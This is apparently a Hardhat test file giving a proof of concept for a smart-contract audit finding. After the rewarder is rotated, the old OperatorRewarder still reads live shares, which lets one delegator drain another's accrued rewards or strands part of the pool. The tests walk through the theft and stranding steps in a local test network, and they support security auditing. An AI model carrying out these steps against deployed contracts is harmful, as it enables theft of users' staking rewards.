import { mine, time } from '@nomicfoundation/hardhat-network-helpers';
import { expect } from 'chai';
import { ethers, network, upgrades } from 'hardhat';

// Land multiple txs in a single block so per-tx +1s drift doesn't skew the
// frozen `_rewardsPaid` snapshots between depositors.
async function batch(txs: () => Promise<unknown>) {
  await network.provider.send('evm_setAutomine', [false]);
  try {
    await txs();
  } finally {
    await mine();
    await network.provider.send('evm_setAutomine', [true]);
  }
}

// PoC for the Burrasec finding: after `OperatorStaking.setRewarder` rotates
// the rewarder, the old rewarder's `earned()` keeps reading live shares from
// `OperatorStaking`. This allows theft (one delegator draining another's
// accrued reward) and stranding (post-rotation depositors dilute the frozen
// pool). See `burrasec-issue.md` and `test/foundry/POC.t.sol`.
describe('OperatorRewarder — post-rotation vulnerability (Burrasec)', function () {
  const REWARD_RATE = ethers.parseEther('1'); // 1 token / sec
  const COOLDOWN = 24 * 60 * 60;
  const DEPOSIT = ethers.parseEther('100');
  const ACCRUAL_SECONDS = 1000;

  beforeEach(async function () {
    const [admin, beneficiary, alice, bob, carol] = await ethers.getSigners();

    const token = await ethers.deployContract('$ERC20Mock', ['StakingToken', 'ST', 18]);
    const protocolStaking = await ethers.getContractFactory('ProtocolStakingSlashingMock').then(factory =>
      upgrades.deployProxy(factory, [
        'Staked',
        'sST',
        '1',
        token.target,
        admin.address,
        admin.address,
        COOLDOWN,
        REWARD_RATE,
      ]),
    );
    const operatorStaking = await ethers.getContractFactory('OperatorStaking').then(factory =>
      upgrades.deployProxy(factory, ['OP', 'OP', protocolStaking.target, beneficiary.address, 10000, 0]),
    );
    const rewarderOld = await ethers.getContractAt('OperatorRewarder', await operatorStaking.rewarder());

    await protocolStaking.connect(admin).addEligibleAccount(operatorStaking);

    for (const account of [alice, bob, carol]) {
      await token.mint(account.address, ethers.parseEther('1000'));
      await token.$_approve(account.address, operatorStaking.target, ethers.MaxUint256);
    }

    Object.assign(this, { admin, beneficiary, alice, bob, carol, token, protocolStaking, operatorStaking, rewarderOld });
  });

  async function rotateRewarder(ctx: any) {
    const rewarderNew = await ethers.deployContract('OperatorRewarder', [
      ctx.beneficiary.address,
      ctx.protocolStaking.target,
      ctx.operatorStaking.target,
      10000,
      0,
    ]);
    await ctx.operatorStaking.connect(ctx.admin).setRewarder(rewarderNew.target);
    expect(await ctx.rewarderOld.isShutdown()).to.equal(true);
    expect(await rewarderNew.isShutdown()).to.equal(false);
    return rewarderNew;
  }

  it('theft: post-rotation redeem lets Alice drain Bob’s accrued rewards', async function () {
    await batch(async () => {
      await this.operatorStaking.connect(this.alice).deposit(DEPOSIT, this.alice);
      await this.operatorStaking.connect(this.bob).deposit(DEPOSIT, this.bob);
    });

    const bobShares = await this.operatorStaking.balanceOf(this.bob.address);

    await time.increase(ACCRUAL_SECONDS);
    await rotateRewarder(this);

    const pool = await this.token.balanceOf(this.rewarderOld.target);
    const aliceEarnedAtSwap = await this.rewarderOld.earned(this.alice.address);
    const bobEarnedAtSwap = await this.rewarderOld.earned(this.bob.address);

    // both fair-owed ~ half the pool (tolerance covers Hardhat's 1s-per-tx timestamp drift
    // between Alice's and Bob's deposits)
    const halfPoolTolerance = ethers.parseEther('2');
    expect(aliceEarnedAtSwap).to.be.closeTo(pool / 2n, halfPoolTolerance);
    expect(bobEarnedAtSwap).to.be.closeTo(pool / 2n, halfPoolTolerance);

    // Bob performs a normal redeem request AFTER rotation — hook goes to the new rewarder,
    // old rewarder's _rewardsPaid[Bob] is frozen but old rewarder still reads live shares.
    await this.operatorStaking.connect(this.bob).requestRedeem(bobShares, this.bob.address, this.bob.address);

    const aliceEarnedAfter = await this.rewarderOld.earned(this.alice.address);
    const bobEarnedAfter = await this.rewarderOld.earned(this.bob.address);

    expect(bobEarnedAfter).to.equal(0n); // Bob's claim wiped
    expect(aliceEarnedAfter).to.be.closeTo(pool, halfPoolTolerance); // Alice inherits the whole pool
    // Alice's "earned" roughly doubles vs. her fair share
    expect(aliceEarnedAfter).to.be.greaterThan((aliceEarnedAtSwap * 19n) / 10n);

    const aliceBefore = await this.token.balanceOf(this.alice.address);
    await this.rewarderOld.connect(this.alice).claimRewards(this.alice.address);
    const alicePayout = (await this.token.balanceOf(this.alice.address)) - aliceBefore;

    expect(alicePayout).to.be.closeTo(pool, halfPoolTolerance); // Alice drains the pool
    expect(await this.token.balanceOf(this.rewarderOld.target)).to.equal(0n);
  });

  it('strand: post-rotation deposit by Carol permanently strands part of the pool', async function () {
    await batch(async () => {
      await this.operatorStaking.connect(this.alice).deposit(DEPOSIT, this.alice);
      await this.operatorStaking.connect(this.bob).deposit(DEPOSIT, this.bob);
    });

    await time.increase(ACCRUAL_SECONDS);
    await rotateRewarder(this);

    const pool = await this.token.balanceOf(this.rewarderOld.target);
    const aliceEarnedAtSwap = await this.rewarderOld.earned(this.alice.address);
    const bobEarnedAtSwap = await this.rewarderOld.earned(this.bob.address);
    const sumBefore = aliceEarnedAtSwap + bobEarnedAtSwap;
    expect(sumBefore).to.be.closeTo(pool, 4n);

    // Carol deposits AFTER rotation — she's a new share holder as far as the old rewarder is concerned.
    await this.operatorStaking.connect(this.carol).deposit(DEPOSIT, this.carol);

    const aliceEarnedAfter = await this.rewarderOld.earned(this.alice.address);
    const bobEarnedAfter = await this.rewarderOld.earned(this.bob.address);

    // Alice & Bob now compete with Carol on the old frozen pool → their claims shrink.
    expect(aliceEarnedAfter).to.be.lessThan(sumBefore / 2n);
    expect(bobEarnedAfter).to.be.lessThan(sumBefore / 2n);
    expect(aliceEarnedAfter + bobEarnedAfter).to.be.lessThan((pool * 7n) / 10n);

    const aliceBefore = await this.token.balanceOf(this.alice.address);
    const bobBefore = await this.token.balanceOf(this.bob.address);
    await this.rewarderOld.connect(this.alice).claimRewards(this.alice.address);
    await this.rewarderOld.connect(this.bob).claimRewards(this.bob.address);
    const paid = (await this.token.balanceOf(this.alice.address)) - aliceBefore + (await this.token.balanceOf(this.bob.address)) - bobBefore;
    const stranded = await this.token.balanceOf(this.rewarderOld.target);

    expect(paid).to.be.lessThan((pool * 7n) / 10n);
    expect(stranded).to.be.greaterThan(pool / 4n);
  });
});
